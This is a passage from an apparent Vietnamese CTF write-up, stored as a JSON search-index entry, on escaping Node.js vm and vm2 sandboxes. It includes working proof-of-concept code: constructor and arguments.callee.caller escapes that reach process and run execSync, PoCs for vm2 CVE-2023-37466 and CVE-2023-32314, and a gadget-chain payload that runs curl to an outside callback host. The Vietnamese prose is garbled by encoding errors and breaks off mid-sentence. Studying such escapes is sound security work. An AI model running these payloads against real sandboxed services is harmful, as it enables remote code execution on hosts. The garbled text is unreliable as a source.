[
  
  {
    "title": "NodeJS escape VM and some gadgets chaining in NodeJS",
    "url": "/posts/Nodejs-escapeVM/",
    "categories": "CTF Writeup",
    "tags": "NodeJS, Esacpe VM",
    "date": "2024-08-11 23:00:00 +0700",
    





    
    "snippet": "NodeJS escape VM and some gadgets chaining in NodeJSSandbox lÃ  gÃ¬?Khi chÃºng ta cháº¡y má»™t sá»‘ chÆ°Æ¡ng trÃ¬nh cÃ³ thá»ƒ gÃ¢y nguy hiá»ƒm cho há»‡ thá»‘ng thÃ¬ chÃºng ta cáº§n má»™t cÃ¡ch Ä‘á»ƒ cháº¡y chÃºng mÃ  khÃ´ng áº£nh hÆ°á»Ÿng ...",
    "content": "NodeJS escape VM and some gadgets chaining in NodeJSSandbox lÃ  gÃ¬?Khi chÃºng ta cháº¡y má»™t sá»‘ chÆ°Æ¡ng trÃ¬nh cÃ³ thá»ƒ gÃ¢y nguy hiá»ƒm cho há»‡ thá»‘ng thÃ¬ chÃºng ta cáº§n má»™t cÃ¡ch Ä‘á»ƒ cháº¡y chÃºng mÃ  khÃ´ng áº£nh hÆ°á»Ÿng Ä‘áº¿n há»‡ thá»‘ng. ÄÃ³ chÃ­nh lÃ  lÃ½ do mÃ  sandbox ra Ä‘á»i. Sandbox lÃ  má»™t mÃ´i trÆ°á»ng áº£o Ä‘Æ°á»£c táº¡o ra hoÃ n toÃ n cÃ´ láº­p vá»›i mÃ¡y chÃ­nh (nhÆ°ng váº«n sá»­ dá»¥ng tÃ i nguyÃªn cá»§a mÃ¡y chÃ­nh) Ä‘á»ƒ cháº¡y cÃ¡c chÆ°Æ¡ng trÃ¬nh mÃ  khÃ´ng áº£nh hÆ°á»Ÿng Ä‘áº¿n há»‡ thá»‘ng. Do Ä‘Ã³, báº¥t ká»³ áº£nh hÆ°á»›ng gÃ¢y háº¡i nÃ o tá»« code Ä‘á»™c háº¡i sáº½ chá»‰ áº£nh hÆ°á»Ÿng lÃªn sandbox khÃ´ng áº£nh hÆ°á»›ng Ä‘áº¿n mÃ¡y chÃ­nh.Escape VMVM escape xáº£y ra khi attacker cÃ³ thá»ƒ thoÃ¡t ra ngoÃ i mÃ´i trÆ°á»ng Ä‘á»™c láº­p kia vÃ  thá»±c hiá»‡n cÃ¡c lá»‡nh Ä‘á»™c háº¡i lÃªn mÃ¡y chÃ­nh. ÄÃ¢y lÃ  má»™t lá»—i ráº¥t nguy hiá»ƒm vÃ¬ nÃ³ cÃ³ thá»ƒ Ä‘á»ƒ attacker cÃ³ kháº£ nÄƒng xÃ¢m nháº­p vÃ o mÃ¡y chÃ­nhModule VMSá»­ dá»¥ng module node:vm (ngoÃ i ra cÃ²n cÃ³ vm2 ) cho phÃ©p láº­p trÃ¬nh viÃªn biÃªn dá»‹ch vÃ  cháº¡y code Ä‘á»™ng bÃªn trong ngá»¯ cáº£nh V8 Vitural Machine, cÃ³ thá»ƒ hiá»ƒu Ä‘Æ¡n giáº£n lÃ  code Ä‘Æ°á»£c thá»±c thi cÃ³ global object khÃ¡c vá»›i code gá»i nÃ³. VÃ­ dá»¥const vm = require('node:vm');const x = 1;const context = { x: 2 };vm.createContext(context); // táº¡o ngá»¯ cáº£nhconst code = 'x += 40; var y = 17;';// `x` and `y` are global variables in the context.// Initially, x has the value 2 because that is the value of context.x.vm.runInContext(code, context);console.log(context.x); // 42console.log(context.y); // 17console.log(x);console.log(y); // 1; y is not defined. CÃ³ nghÄ©a lÃ  code cháº¡y trong context sáº½ khÃ´ng áº£nh hÆ°á»Ÿng Ä‘áº¿n biáº¿n ngoÃ i context vÃ  ngÆ°á»£c láº¡iAn insecure JavaScript sandbox  vm.runInThisContext(code):Táº¡o má»™t sandbox trong pháº¡m vi global hiá»‡n táº¡i vÃ  thá»±c thi mÃ£ truyá»n vÃ o nhÆ° lÃ  tham sá»‘. Sandbox nÃ y truy cáº­p Ä‘Æ°á»£c vÃ o cÃ¡c thuá»™c tÃ­nh cá»§a global nhÆ°ng khÃ´ng thá»ƒ truy cáº­p vÃ o cÃ¡c thuá»™c tÃ­nh cá»§a cÃ¡c module khÃ¡cconst vm = require('vm');let globalobject = process;const vmResult = vm.runInThisContext('process');;if (globalobject === vmResult) {    console.log('VM is running in the global context');}///VM is running in the global contextconst vm = require('vm');let localVar = 'di';const vmResult = vm.runInThisContext('localVar = \"box\";');console.log('vmResult:', vmResult);console.log('localVar:', localVar);// vmResult: 'box', localVar: 'di'  vm.createContext([sandbox]): TrÆ°á»›c khi sá»­ dá»¥ng, cáº§n táº¡o má»™t Ä‘á»‘i tÆ°á»£ng sandbox, sau Ä‘Ã³ chuyá»ƒn Ä‘á»‘i tÆ°á»£ng sandbox nÃ y lÃ m tham sá»‘ cho phÆ°Æ¡ng thá»©c (náº¿u khÃ´ng cÃ³, má»™t Ä‘á»‘i tÆ°á»£ng sandbox rá»—ng sáº½ Ä‘Æ°á»£c táº¡o tá»± Ä‘á»™ng). V8 (JavaScript Engine) táº¡o ra má»™t pháº¡m vi má»›i bÃªn ngoÃ i global hiá»‡n táº¡i cho Ä‘á»‘i tÆ°á»£ng sandbox. LÃºc nÃ y, Ä‘á»‘i tÆ°á»£ng sandbox trá»Ÿ thÃ nh Ä‘á»‘i tÆ°á»£ng toÃ n cá»¥c cá»§a pháº¡m vi má»›i Ä‘Æ°á»£c táº¡o, vÃ  bÃªn trong sandbox, khÃ´ng thá»ƒ truy cáº­p cÃ¡c thuá»™c tÃ­nh trong globalconst vm = require('vm');global.test = 9;const sandbox = { test : 9};vm.createContext(sandbox);vm.runInContext('test = test + 3', sandbox);console.log(global.test); // 9console.log(sandbox); // { test: 12 }HÃ m vm.runInNewContext(code[, sandbox][, options]) lÃ  sá»± káº¿t há»£p cá»§a createContext vÃ  runInContext. NÃ³ nháº­n vÃ o mÃ£ cáº§n thá»±c thi (code), má»™t Ä‘á»‘i tÆ°á»£ng sandbox vÃ  tÃ¹y chá»n (options). NÃ³i Ä‘Æ¡n giáº£n lÃ  gá»™p 2 function lÃ m má»™tvm.Script lÃ  má»™t lá»›p trong Node.js cho phÃ©p báº¡n biÃªn dá»‹ch vÃ  cháº¡y Ä‘oáº¡n mÃ£ JavaScript trong má»™t ngá»¯ cáº£nh cá»¥ thá»ƒ. CÃ¡c Ä‘á»‘i tÆ°á»£ng cá»§a lá»›p vm.Script chá»©a cÃ¡c Ä‘oáº¡n mÃ£ Ä‘Ã£ Ä‘Æ°á»£c biÃªn dá»‹ch trÆ°á»›c vÃ  cÃ³ thá»ƒ Ä‘Æ°á»£c thá»±c thi nhiá»u láº§n trong má»™t hoáº·c nhiá»u sandbox.script cÃ³ thá»ƒ Ä‘Æ°á»£c cháº¡y thÃ´ng qua runInNewContextKhi thá»±c hiá»‡n thoÃ¡t khá»i sandbox, má»¥c tiÃªu thÆ°á»ng lÃ  thá»±c hiá»‡n RCE (Remote Code Execution). Trong Node.js, Ä‘á»ƒ thá»±c hiá»‡n RCE, chÃºng ta cáº§n truy cáº­p vÃ o Ä‘á»‘i tÆ°á»£ng process. Má»™t khi Ä‘Ã£ cÃ³ Ä‘Æ°á»£c Ä‘á»‘i tÆ°á»£ng process, chÃºng ta cÃ³ thá»ƒ sá»­ dá»¥ng require Ä‘á»ƒ nháº­p child_process vÃ  sau Ä‘Ã³ dÃ¹ng child_process Ä‘á»ƒ thá»±c thi cÃ¡c lá»‡nh há»‡ thá»‘ng. Máº·c dÃ¹ Ä‘á»‘i tÆ°á»£ng process Ä‘Æ°á»£c gáº¯n vÃ o global, khi táº¡o má»™t ngá»¯ cáº£nh má»›i (sá»­ dá»¥ng createContext), Ä‘á»‘i tÆ°á»£ng global khÃ´ng cÃ²n cÃ³ thá»ƒ truy cáº­p Ä‘Æ°á»£c. VÃ¬ váº­y, má»¥c tiÃªu cuá»‘i cÃ¹ng lÃ  tÃ¬m cÃ¡ch Ä‘Æ°a Ä‘á»‘i tÆ°á»£ng process tá»« global vÃ o mÃ´i trÆ°á»ng sandbox.const vm = require(\"vm\");const test = vm.runInNewContext(`this.constructor.constructor('return process.env')()`);console.log(test);hoáº·cconst vm = require('vm');const sandbox = { test : 1337};vm.createContext(sandbox);vm.runInContext(`test = this.constructor.constructor('return process.env')()`, sandbox);console.log(sandbox)Váº­y vÃ¬ sao chÃºng ta cÃ³ thá»ƒ thoÃ¡t khá»i sandbox vÃ  access Ä‘Æ°á»£c global? LÃ½ do lÃ  vÃ¬ trong Ä‘oáº¡n code trÃªn this trá» Ä‘áº¿n runInContext ( hoáº·c runInNewContext), nÃ³ khÃ´ng thuá»™c vá» sandbox, chÃºng ta cÃ³ thá»ƒ dá»±a vÃ o cÃ¡i nÃ y Ä‘á»ƒ láº¥y constructor cá»§a nÃ³ sau Ä‘Ã³ tiáº¿p tá»¥c láº¥y constructor cá»§a nÃ³ ta sáº½ láº¥y Ä‘Æ°á»£c Function (cÃ¡i nÃ y lÃ  cá»§a bÃªn ngoÃ i sandbox). Cuá»‘i cÃ¹ng dá»±a vÃ o Function mÃ  ta vá»«a láº¥y Ä‘Æ°á»£c ta cÃ³ thá»ƒ láº¥y Ä‘Æ°á»£c processNÃ³i má»™t cÃ¡ch Ä‘Æ¡n giáº£n, quÃ¡ trÃ¬nh nÃ y ta chain cÃ¡c gadget Ä‘á»ƒ truy cáº­p Ä‘áº¿n constructor cá»§a Function, sau Ä‘Ã³ táº¡o hÃ m vÃ  láº¥y process. ÄÃ¢y chÃ­nh lÃ  cÃ¡ch Ä‘Æ¡n giáº£n nháº¥t Ä‘á»ƒ thoÃ¡t khá»i sandboxSau khi cÃ³ process thÃ¬ RCE lÃ  chuyá»‡n Ä‘Æ¡n giáº£nMá»™t sá»‘ trÆ°á»ng há»£p khÃ¡cconst vm = require('vm');const script = `(() =&gt; {  const a = {};  a.toString = function () {    const cc = arguments.callee.caller;    const p = (cc.constructor.constructor('return process'))();    return p.mainModule.require('child_process').execSync('whoami').toString();  };  return a;})()`;const sandbox = Object.create(null);const context = new vm.createContext(sandbox);const res = vm.runInContext(script, context);console.log('Hello ' + res);Khi this Ä‘ang lÃ  null vÃ  khÃ´ng cÃ³ Ä‘á»‘i tÆ°á»£ng nÃ o khÃ¡c Ä‘á»ƒ tham chiáº¿u, chÃºng ta cÃ³ thá»ƒ táº­n dá»¥ng thuá»™c tÃ­nh ná»™i táº¡i cá»§a Ä‘á»‘i tÆ°á»£ng hÃ m, cá»¥ thá»ƒ lÃ  arguments.callee.caller. Thuá»™c tÃ­nh nÃ y cho phÃ©p chÃºng ta xÃ¡c Ä‘á»‹nh hÃ m nÃ o Ä‘Ã£ gá»i hÃ m hiá»‡n táº¡i.Trong tÃ¬nh huá»‘ng nÃ y, viá»‡c thoÃ¡t khá»i sandbox (sandbox escape) thá»±c cháº¥t lÃ  tÃ¬m má»™t Ä‘á»‘i tÆ°á»£ng bÃªn ngoÃ i mÃ´i trÆ°á»ng sandbox vÃ  gá»i má»™t trong cÃ¡c phÆ°Æ¡ng thá»©c cá»§a nÃ³. CÃ¡ch thá»±c hiá»‡n lÃ  Ä‘á»‹nh nghÄ©a má»™t hÃ m trong sandbox, sau Ä‘Ã³ gá»i hÃ m Ä‘Ã³ tá»« bÃªn ngoÃ i sandbox. Khi hÃ m trong sandbox Ä‘Æ°á»£c gá»i, thuá»™c tÃ­nh arguments.callee.caller sáº½ tráº£ vá» Ä‘á»‘i tÆ°á»£ng hÃ m tá»« bÃªn ngoÃ i sandbox. Tá»« Ä‘Ã³, chÃºng ta cÃ³ thá»ƒ khai thÃ¡c Ä‘á»ƒ thá»±c hiá»‡n viá»‡c thoÃ¡t khá»i mÃ´i trÆ°á»ng sandbox.Giáº£i thÃ­ch Ä‘Æ¡n giáº£nTÃ³m láº¡i, muá»‘n escape sandbox thÃ¬ chÃºng ta cáº§n access Ä‘Æ°á»£c báº¥t ká»³ thá»© gÃ¬ khÃ´ng thuá»™c sandbox, nhÆ° 2 vÃ­ dá»¥ trÃªn lÃ  Function vÃ  arguments.callee.caller vÃ  tá»« Ä‘Ã³ ta cÃ³ thá»ƒ lÃ m báº¥t cá»© Ä‘iá»u gÃ¬.  NgoÃ i vm ra thÃ¬ cÃ²n má»™t module khÃ¡c lÃ  vm2 Ä‘Æ°á»£c coi lÃ  â€œbáº£n nÃ¢ng cáº¥pâ€ cá»§a vm. vm2 lÃ  má»™t sandbox há»• trá»£ cháº¡y cÃ¡c unstrusted code vá»›i cÃ¡c built-in module cá»§a Nodejs. vm2 dÃ¹ng Proxy Ä‘á»ƒ ngÄƒn cháº·n thoÃ¡t khá»i sandbox. Tuy nhiÃªn tÆ°Æ¡ng tá»± nhÆ° vm thÃ¬ vm2 cÅ©ng cÃ³ thá»ƒ bá»‹ thoÃ¡t khá»i sandbox nhÆ°ng cÃ¡ch thá»©c thoÃ¡t khá»i nÃ³ phá»©c táº¡p hÆ¡n nÃªn ta sáº½ Ä‘i vÃ o phÃ¢n tÃ­ch cÃ¡c CVE gáº§n Ä‘Ã¢yCVE-2023-37466In vm2 for versions up to 3.9.19, Promise handler sanitization can be bypassed with @@species accessor property allowing attackers to escape the sandbox and run arbitrary code.POCconst {VM} = require(\"vm2\");const vm = new VM();const code = `async function fn() {    (function stack() {        new Error().stack;        stack();    })();}p = fn();p.constructor = {    [Symbol.species]: class FakePromise {        constructor(executor) {            executor(                (x) =&gt; x,                (err) =&gt; { return err.constructor.constructor('return process')().mainModule.require('child_process').execSync('touch pwned'); }            )        }    }};p.then();`;console.log(vm.run(code));PhÃ¢n tÃ­chMá»™t tráº¡ng thÃ¡i báº¥t thÆ°á»ng cá»§a mÃ¡y chÃ­nh trong ngá»¯ cáº£nh báº¥t Ä‘á»“ng bá»™ (Promise) sáº½ cÃ³ thá»ƒ leak object cá»§a mÃ¡y chÃ­nh ra ngoÃ i, nhÆ° á»Ÿ trÃªn ta cÃ³ thá»ƒ dá»±a vÃ o Ä‘Ã¢y Ä‘á»ƒ thoÃ¡t khá»i sandbox vÃ  RCEBan Ä‘áº§u khi má»›i vÃ o thÃ¬ Promise.prototype.then Ä‘Ã£ bá»‹ viáº¿t Ä‘Ã¨ báº±ng cÃ¡ch dÃ¹ng Proxy Ä‘á»ƒ khá»­ cÃ¡c tham sá»‘ mÃ  ngÆ°á»i dÃ¹ng cung cáº¥p cho function onRejectedÄá»c document cá»§a ES2022 cá»§a Promise.prototype.then cÃ³ chá»‰ má»™t Ä‘oáº¡n liÃªn quan Ä‘áº¿n @@species á»Ÿ Ä‘Ã¢y linkWhen the then method is called with arguments onFulfilled and onRejected, the following steps are taken:1. Let promise be the this value.2. If IsPromise(promise) is false, throw a TypeError exception.**3. Let C be ? SpeciesConstructor(promise, %Promise%).****4. Let resultCapability be ? NewPromiseCapability(C).****5. Return PerformPromiseThen(promise, onFulfilled, onRejected, resultCapability).**CÃ³ 3 Ä‘oáº¡n cáº§n chÃº Ã½ á»Ÿ trÃªn Ä‘Ã³ lÃ  SpeciesConstructor, NewPromiseCapability vÃ  PerformPromiseThen1. Let C be ? Get(O, \"constructor\").2. If C is undefined, return defaultConstructor.3. If Type(C) is not Object, throw a TypeError exception.4. Let S be ? Get(C, @@species).5. If S is either undefined or null, return defaultConstructor.6. If IsConstructor(S) is true, return S.7. Throw a TypeError exception.ÄÃ¢y lÃ  pesudo code cá»§a SpeciesConstructor cáº£ Ä‘oáº¡n trÃªn tÃ³m láº¡i lÃ  nÃ³ sáº½ return object @@speciesvÃ  tiáº¿p theo lÃ   NewPromiseCapability1. If IsConstructor(C) is false, throw a TypeError exception.2. NOTE: C is assumed to be a constructor function that supports the parameter conventions of the Promise constructor (see 27.2.3.1).3. Let promiseCapability be the PromiseCapability Record { [[Promise]]: undefined, [[Resolve]]: undefined, [[Reject]]: undefined }.4. Let executorClosure be a new Abstract Closure with parameters (resolve, reject) that captures promiseCapability and performs the following steps when called:a. If promiseCapability.[[Resolve]] is not undefined, throw a TypeError exception.b. If promiseCapability.[[Reject]] is not undefined, throw a TypeError exception.c. Set promiseCapability.[[Resolve]] to resolve.d. Set promiseCapability.[[Reject]] to reject.e. Return undefined.5. Let executor be CreateBuiltinFunction(executorClosure, 2, \"\", Â« Â»).6. Let promise be ? Construct(C, Â« executor Â»).7. If IsCallable(promiseCapability.[[Resolve]]) is false, throw a TypeError exception.8. If IsCallable(promiseCapability.[[Reject]]) is false, throw a TypeError exception.9. Set promiseCapability.[[Promise]] to promise.10. Return promiseCapability.Cáº£ Ä‘oáº¡n trÃªn ta cÃ³ thá»ƒ rÃºt gá»n bá» Ä‘i cÃ¡c pháº§n khÃ´ng liÃªn quan Ä‘áº¿n CVE lÃ  nhÆ° sau  NewPromiseCapability cho phÃ©p táº¡o má»™t constructor vÃ  gÃ¡n nÃ³ báº±ng giÃ¡ trá»‹ cá»§a @@sepcies, sau Ä‘Ã³ sá»­ dá»¥ng executor lÃ  má»™t closure (Ä‘áº¡i loáº¡i lÃ  nÃ³ cÃ³ thá»ƒ access Ä‘Æ°á»£c cÃ¡c biáº¿n tá»« pháº¡m vi bÃªn ngoÃ i nÃ³) nháº­n 2 xá»­ lÃ½ lÃ  resolve vÃ  reject vÃ  gÃ¡n má»—i giÃ¡ trá»‹ vÃ o resultCapability.[[Resolve]] vÃ  resultCapability.[[Reject]].Tiáº¿p tá»¥c á»Ÿ Ä‘oáº¡n PerformPromiseThen, nÃ³ cÃ³ Ä‘á»‹nh nghÄ©a promise.[[PromiseState]] lÃºc bá»‹ rejected8. Let rejectReaction be the PromiseReaction { [[Capability]]: resultCapability, [[Type]]: Reject, [[Handler]]: onRejectedJobCallback }.9. If promise.[[PromiseState]] is pending, then ...10. Else if promise.[[PromiseState]] is fulfilled, then ...11. Else,    a. Assert: The value of promise.[[PromiseState]] is rejected.    b. Let reason be promise.[[PromiseResult]].    c. If promise.[[PromiseIsHandled]] is false, perform HostPromiseRejectionTracker(promise, \"handle\").    d. Let rejectJob be NewPromiseReactionJob(rejectReaction, reason).    e. Perform HostEnqueuePromiseJob(rejectJob.[[Job]], rejectJob.[[Realm]]).Trong nÃ y cÃ³ 1 Ä‘oáº¡n quan trá»ng lÃ  rejectJob = NewPromiseReactionJob(rejectReaction, reason) vÃ¬ nÃ³ sáº½ lÃ  Ä‘iá»u kiá»‡n Ä‘á»ƒ chÃºng ta thá»±c hiá»‡n RCETiáº¿p tá»¥c Ä‘á»c mÃ£ giáº£ cá»§a NewPromiseReactionJob1. Let job be a new Job Abstract Closure with no parameters that captures reaction and argument and performs the following steps when called:    a. Let promiseCapability be reaction.[[Capability]].    b. Let type be reaction.[[Type]].    c. Let handler be reaction.[[Handler]].    d. **If handler is empty, then**        i. If type is Fulfill, let handlerResult be NormalCompletion(argument).        ii. Else,            1. Assert: type is Reject.            2. **Let handlerResult be ThrowCompletion(argument).**    e. Else, let handlerResult be Completion(HostCallJobCallback(handler, undefined, Â« argument Â»)).    f. If promiseCapability is undefined, then        i. Assert: handlerResult is not an abrupt completion.        ii. Return empty.    g. Assert: promiseCapability is a PromiseCapability Record.    h. **If handlerResult is an abrupt completion, then**        i. **Return ? Call(promiseCapability.[[Reject]], undefined, Â« handlerResult.[[Value]] Â»).**    i. Else,        i. Return ? Call(promiseCapability.[[Resolve]], undefined, Â« handlerResult.[[Value]] Â»).Ta sáº½ chÃº Ã½ Ä‘áº¿n cÃ¡c Ä‘oáº¡n d.ii, h.iNáº¿u handler khÃ´ng lÃ  rá»—ng vÃ  type lÃ  Reject (nghÄ©a lÃ  promise Ä‘ang bá»‹ tá»« chá»‘i), thÃ¬ handlerResult sáº½ Ä‘Æ°á»£c gÃ¡n lÃ  má»™t hoÃ n thÃ nh kiá»ƒu nÃ©m lá»—i cá»§a argument. Äiá»u nÃ y thá»ƒ hiá»‡n viá»‡c promise Ä‘Ã£ bá»‹ tá»« chá»‘i.Sau Ä‘Ã³ lÃ Náº¿u handlerResult lÃ  má»™t hoÃ n thÃ nh Ä‘á»™t ngá»™t(abrupt completion), thÃ¬Tráº£ vá» ? Call(promiseCapability.[[Reject]], undefined, Â« handlerResult.[[Value]] Â»).Náº¿u handlerResult lÃ  má»™t hoÃ n thÃ nh Ä‘á»™t ngá»™t (nghÄ©a lÃ  xáº£y ra lá»—i trong quÃ¡ trÃ¬nh xá»­ lÃ½), thÃ¬ cáº§n pháº£i gá»i hÃ m Reject cá»§a promiseCapability vá»›i giÃ¡ trá»‹ lá»—i tá»« handlerResult.Váº­y tá»« táº¥t cáº£ thá»© trÃªn, tÃ³m láº¡i ta cÃ³ thá»ƒ escape sandbox nhÆ° sau:  Gá»i má»™t function báº¥t Ä‘á»“ng bá»™ Ä‘á»ƒ nÃ³ throw ra tráº¡ng thÃ¡i báº¥t thÆ°á»ng á»Ÿ mÃ¡y chÃ­nh, tráº£ vá» rejected Promise object  Ta sáº½ ghi Ä‘Ã¨ constructor cá»§a Promise object vá»›i thuá»™c tÃ­nh cá»§a @@species (Symbol.species) vá»›i giÃ¡ trá»‹ lÃ  executor thá»«a hÆ°á»Ÿng tá»« lá»›p cha vÃ  gá»i vá»›i 2 hÃ m xá»­ lÃ½ resolve vÃ  reject(ta bá» payload vÃ o Ä‘Ã¢y)  Gá»i then Ä‘á»ƒ trigger Call(promiseCapability.[[Reject]], undefined, Â« handlerResult.[[Value]] Â»). vÃ  ez RCECVE-2023-32314A sandbox escape vulnerability exists in vm2 for versions up to 3.9.17. It abuses an unexpected creation of a host object based on the specification of Proxy, and allows RCE via Function in the host context.POCconst { VM } = require(\"vm2\");const vm = new VM();const code = `  const err = new Error();  err.name = {    toString: new Proxy(() =&gt; \"\", {      apply(target, thiz, args) {        const process = args.constructor.constructor(\"return process\")();        throw process.mainModule.require(\"child_process\").execSync(\"echo hacked\").toString();      },    }),  };  try {    err.stack;  } catch (stdout) {    stdout;  }`;console.log(vm.run(code));PhÃ¢n tÃ­chCVE nÃ y nhÃ¬n cÅ©ng khÃ¡ giá»‘ng CVE trÃªn kia nhÆ°ng nÃ³ Ä‘Æ¡n giáº£n hÆ¡nKhi err.name.toString Ä‘Æ°á»£c gá»i á»Ÿ  ErrorPrototypeToString trong prepareStackTrace thÃ¬ nÃ³ láº¡i lÃ  trong ngá»¯ cáº£nh cá»§a mÃ¡y chÃ­nh  error cá»§a  prepareStackTrace khÃ´ng Ä‘Æ°á»£c xá»­ lÃ½ qua cÆ¡ cháº¿ proxy cá»§a vm2 nÃªn nÃ³ Ä‘Æ°á»£c gá»i tháº³ng bá»Ÿi V8VÃ  cÃ²n 1 Ä‘iá»u ná»¯a lÃ  á»Ÿ Proxy khi Ä‘Æ°á»£c gá»i Ä‘áº¿n nÃ³ cÃ³ 1 Ä‘oáº¡n mÃ£ giáº£ nhÆ° sau7. Let argArray be CreateArrayFromList(argumentsList).8. Return ? Call(trap, handler, Â« target, thisArgument, argArray Â»).Khi err.name.toString Ä‘Æ°á»£c gá»i thÃ¬ CreateArrayFromList() sáº½ táº¡o ra argArray á»Ÿ ngá»¯ cáº£nh cá»§a mÃ¡y chÃ­nh sau Ä‘Ã³ Ä‘Æ°á»£c truyá»n vÃ o apply(target, thiz, args). Váº­y ta cÃ³ thá»ƒ tiáº¿p cáº­n Ä‘Æ°á»£c Function á»Ÿ mÃ¡y chÃ­nh. Tá»« Ä‘Ã³ RCEGadgets chainingGadgets chaining lÃ  má»™t ká»¹ thuáº­t sá»­ dá»¥ng cÃ¡c gadgets (má»™t chuá»—i cÃ¡c lá»‡nh nhá») Ä‘á»ƒ thá»±c hiá»‡n káº¿t ná»‘i chÃºng láº¡i vá»›i nhau. VÃ­ dá»¥ nhÆ° viá»‡c sá»­ dá»¥ng cÃ¡c gadgets Ä‘á»ƒ thá»±c hiá»‡n má»™t hÃ nh Ä‘á»™ng nhÆ° RCENote: CÃ¡ch nÃ y mÃ¬nh Ä‘Ã£ Ä‘á»c Ä‘Æ°á»£c tá»« writeup cá»§a cÃ¡c giáº£i amstrong2024 vÃ  TSG2023 vÃ  tham kháº£o cá»§a anh shin24 link mÃ¬nh sáº½ Ä‘Ã­nh kÃ¨m bÃªn dÆ°á»›itoString.constructor.prototype.toString=toString.constructor.prototype.call;var a=[\"process.mainModule.require('child_process').execSync('curl http://yh9wz5br.requestrepo.com')\"];a[1]=\"x\";b={};b[Symbol.hasInstance]=a.sort;b[\"__proto__\"]=a;toString.constructor instanceof b;Giáº£i thÃ­ch sÆ¡ qua vá» payload nÃ y      Äáº§u tiÃªn chÃºng ta sáº½ gá»i Ä‘áº¿n function toString vÃ  gÃ¡n giÃ¡ trá»‹ cá»§a function call cho nÃ³        Tiáº¿p theo ta táº¡o má»™t máº£ng a vá»›i giÃ¡ trá»‹ Ä‘áº§u tiÃªn lÃ  payload mÃ  ta muá»‘n execute (payload nÃ y sáº½ Ä‘Æ°á»£c thá»±c thi trong anonymous function)        Tiáº¿p theo ta gÃ¡n giÃ¡ trá»‹ 'x' cho a[1] (sáº½ giáº£i thÃ­ch á»Ÿ bÃªn dÆ°á»›i vÃ¬ sao cÃ³ pháº§n nÃ y)        Sau Ä‘Ã³ táº¡o má»™t object b vá»›i key lÃ  Symbol.hasInstance vÃ  value lÃ  a.sort        Sau Ä‘Ã³ set __proto__ cá»§a b lÃ  a        Cuá»‘i cÃ¹ng lÃ  kiá»ƒm tra xem toString.constructor cÃ³ pháº£i lÃ  instance cá»§a b (tháº­t ra Ä‘oáº¡n nÃ y khÃ´ng háº³n lÃ  kiá»ƒm tra mÃ  lÃ  Ä‘iá»u kiá»‡n Ä‘á»ƒ RCE)  TrÆ°á»›c khi Ä‘i vÃ o pháº§n phÃ¢n tÃ­ch sÃ¢u hÆ¡n, mÃ¬nh sáº½ giáº£i thÃ­ch vá» cÃ¡ch cá»§a instanceof hoáº¡t Ä‘á»™ngSyntaxobject instanceof constructorToÃ¡n tá»­ instanceof lÃ  toÃ¡n tá»­ dÃ¹ng Ä‘á»ƒ kiá»ƒm tra xem má»™t Ä‘á»‘i tÆ°á»£ng cÃ³ thuá»™c lá»›p nÃ o Ä‘Ã³ hay khÃ´ngVÃ­ dá»¥ Ä‘Æ¡n giáº£n nhÆ° sauclass BOX {}let DI = new BOX();console.log(DI instanceof BOX); //trueNgoÃ i ra náº¿u constructor (pháº§n bÃªn pháº£i cá»§a instanceof) cÃ³ phÆ°Æ¡ng thá»©c Symbol.hasInstance thÃ¬ nÃ³ sáº½ Ä‘Æ°á»£c Æ°u tiÃªn gá»i, vá»›i object (pháº§n bÃªn trÃ¡i cá»§a instanceof) lÃ  tham sá»‘ truyá»n vÃ o cÃ²n bÃªn pháº£i lÃ  this sau Ä‘Ã³ dÃ¹ng káº¿t quáº£ Ä‘á»ƒ tráº£ vá» káº¿t quáº£ cá»§a instanceofVÃ­ dá»¥ 1:BOX = {[Symbol.hasInstance]: (dib) =&gt; {    // console.log(dib)    return dib === 'dib'}};DI = 'dib'console.log(DI instanceof BOX); //trueVÃ­ dá»¥ 2:a = ['1','0']a.__proto__['loG'] = function(a) {    console.log(\"triggered\")}BOX = {[Symbol.hasInstance]: a.loG};DI = Functionconsole.log(DI instanceof BOX); // \"triggered\"// console.log(a)Äáº¿n pháº§n chÃ­nh, Ä‘i sÃ¢u vÃ o giáº£i thÃ­ch vÃ¬ sao nÃ³ hoáº¡t Ä‘á»™ngtoString.constructor instanceof b;Khi cÃ¢u lá»‡nh nÃ y Ä‘Æ°á»£c thá»±c thi thÃ¬:      Khi instanceof Ä‘Æ°á»£c sá»­ dá»¥ng thÃ¬ nÃ³ sáº½ tÃ¬m kiáº¿m xem b cÃ³ thuá»™c tÃ­nh Symbol.hasInstance khÃ´ng? Náº¿u cÃ³ thÃ¬ sáº½ thá»±c thi gá»i tá»›i a.sort lÃ  this vÃ  toString.constructor (AKA Function) lÃ  tham sá»‘ truyá»n vÃ o        Khi a.sort(function sort) Ä‘Æ°á»£c gá»i Ä‘áº¿n thÃ¬ bÃ¬nh thÆ°á»ng  thÃ¬ nÃ³ sáº½ cá»‘ gáº¯ng chuyá»ƒn táº¥t cáº£ cÃ¡c pháº§n tá»­ trong máº£ng thÃ nh string báº±ng hÃ m toString() rá»“i so sÃ¡nh báº±ng function truyá»n vÃ o. Äiá»u nÃ y vÃ´ tÃ¬nh trigger hÃ m call() chÃºng ta Ä‘Ã£ Ä‘á»•i á»Ÿ lÃºc Ä‘áº§u vÃ  bÃ¢y giá» cáº£ array sáº½ trá»Ÿ thÃ nh parameter cá»§a new Function        NÃ³i thÃªm á»Ÿ pháº§n nÃ y vá» lÃ½ do pháº£i set b[__proto__]=a lÃ  vÃ¬ sort lÃ  function cá»§a array nÃªn chÃºng ta pháº£i Ä‘á»•i prototype cá»§a nÃ³ thÃ nh array thÃ¬ sort má»›i cÃ³ thá»ƒ Ä‘Æ°á»£c thá»±c thi vÃ  hÆ¡n háº¿t khi Ä‘Ã³ sort sáº½ Ä‘Æ°á»£c thá»±c thi trÃªn b, b lÃºc nÃ y lÃ  má»™t object nÃªn sort sáº½ cá»‘ gáº¯ng tÃ¬m kiáº¿m array trong object nÃ y báº±ng cÃ¡ch tÃ¬m kiáº¿m trong prototype cá»§a nÃ³ khi Ä‘Ã³ nÃ³ sáº½ tÃ¬m Ä‘Æ°á»£c 1 array trong vÃ¬ ta set prototype cá»§a b lÃ  a        GiÃ¡ trá»‹ return cá»§a new Function nÃ y sáº½ lÃ  má»™t anonymous vá»›i a[0] lÃ  function vÃ  a[1] lÃ  parameter  (function anonymous(x) {process.mainModule.require('child_process').execSync('curl http://yh9wz5br.requestrepo.com')})  Äá»ƒ nÃ³i thÃªm má»™t chÃºt ná»¯a thÃ¬ flow cá»§a chÆ°Æ¡ng trÃ¬nh sáº½ nhÆ° sau trigger sort -&gt; sort nháº­n Function lÃ m tham sá»‘ -&gt; Function lÃ  